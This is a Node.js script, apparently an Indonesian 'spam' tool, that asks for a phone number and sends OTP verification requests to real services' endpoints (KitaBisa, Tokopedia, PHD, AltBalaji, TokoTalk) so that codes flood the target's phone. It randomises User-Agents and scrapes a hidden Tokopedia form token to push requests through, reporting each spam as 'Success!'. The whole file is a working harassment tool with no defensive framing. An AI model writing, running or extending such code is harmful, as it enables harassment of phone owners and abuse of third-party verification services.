// Import dependencies
const axios = require('axios');
const fs = require('fs');
const readline = require('readline');

class Spam {
    constructor(nomer) {
        this.nomer = nomer;
    }

    async kitabisa() {
        try {
            const response = await axios.get(`https://core.ktbs.io/v2/user/registration/otp/${this.nomer}`);
            if (response.status === 200) {
                return `\x1b[92mSpamm kitabisa ${this.nomer} \033[1;32mSuccess!`;
            } else {
                return `\x1b[91mSpamm kitabisa ${this.nomer} \x1b[91mFail!`;
            }
        } catch (error) {
            return `\x1b[91mSpamm kitabisa ${this.nomer} \x1b[91mFail!`;
        }
    }

    async tokopedia() {
        try {
            const userAgent = fs.readFileSync('ua.txt', 'utf-8').split('\n');
            const headers = {
                'User-Agent': userAgent[Math.floor(Math.random() * userAgent.length)],
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Origin': 'https://accounts.tokopedia.com',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            };
            
            const response = await axios.get(`https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=${this.nomer}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister`, { headers });
            const tokenMatch = response.data.match(/<input id=\"Token\" value=\"(.*?)\" type=\"hidden\"/);
            if (!tokenMatch) throw new Error('Token not found');

            const token = tokenMatch[1];
            const formData = {
                otp_type: '116',
                msisdn: this.nomer,
                tk: token,
                email: '',
                original_param: '',
                user_id: '',
                signature: '',
                number_otp_digit: '6'
            };

            const sendResponse = await axios.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', formData, { headers });
            if (sendResponse.data.includes('Anda sudah melakukan 3 kali pengiriman kode')) {
                return `\x1b[91mSpamm Tokopedia ${this.nomer} \x1b[91mFail!`;
            } else {
                return `\x1b[92mSpamm Tokopedia ${this.nomer} \x1b[92mSuccess!`;
            }
        } catch (error) {
            return `\x1b[91mSpamm Tokopedia ${this.nomer} \x1b[91mFail!`;
        }
    }

    async phd() {
        try {
            const response = await axios.post('https://www.phd.co.id/en/users/sendOTP', { phone_number: this.nomer });
            if (response.data.includes('We have sent an OTP to your phone')) {
                return `\x1b[92mSpamm PHD ${this.nomer} \x1b[92mSuccess!`;
            } else {
                return `\x1b[91mSpamm PHD ${this.nomer} \x1b[91mFail!`;
            }
        } catch (error) {
            return `\x1b[91mSpamm PHD ${this.nomer} \x1b[91mFail!`;
        }
    }

    async balaji() {
        try {
            const response = await axios.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID', {
                country_code: '62',
                phone_number: this.nomer
            }, {
                headers: {
                    'Content-Type': 'application/json;charset=UTF-8',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
                    'Origin': 'https://lite.altbalaji.com'
                }
            });
            if (response.data.status === 'ok') {
                return `\x1b[92mSpamm Balaji ${this.nomer} \x1b[92mSuccess!`;
            } else {
                return `\x1b[91mSpamm Balaji ${this.nomer} \x1b[91mFail!`;
            }
        } catch (error) {
            return `\x1b[91mSpamm Balaji ${this.nomer} \x1b[91mFail!`;
        }
    }

    async tokotalk() {
        try {
            const response = await axios.post('https://api.tokotalk.com/v1/no_auth/verifications', {
                key: 'phone',
                value: this.nomer
            }, {
                headers: {
                    'Content-Type': 'application/json;charset=UTF-8',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
            });
            if (response.data.expireAt) {
                return `\x1b[92mSpamm TokoTalk ${this.nomer} \x1b[92mSuccess!`;
            } else {
                return `\x1b[91mSpamm TokoTalk ${this.nomer} \x1b[91mFail!`;
            }
        } catch (error) {
            return `\x1b[91mSpamm TokoTalk ${this.nomer} \x1b[91mFail!`;
        }
    }
}

async function main() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const question = (query) => new Promise(resolve => rl.question(query, resolve));

    console.log('\nSpam Application\n');
    const number = await question('Enter the phone number: ');
    const spam = new Spam(number);

    console.log('Choose spam type:');
    console.log('1. KitaBisa\n2. Tokopedia\n3. PHD\n4. Balaji\n5. TokoTalk\n');

    const choice = await question('Enter your choice: ');
    let result;

    switch (choice) {
        case '1':
            result = await spam.kitabisa();
            break;
        case '2':
            result = await spam.tokopedia();
            break;
        case '3':
            result = await spam.phd();
            break;
        case '4':
            result = await spam.balaji();
            break;
        case '5':
            result = await spam.tokotalk();
            break;
        default:
            result = 'Invalid choice';
    }

    console.log(result);
    rl.close();
}

main();
              
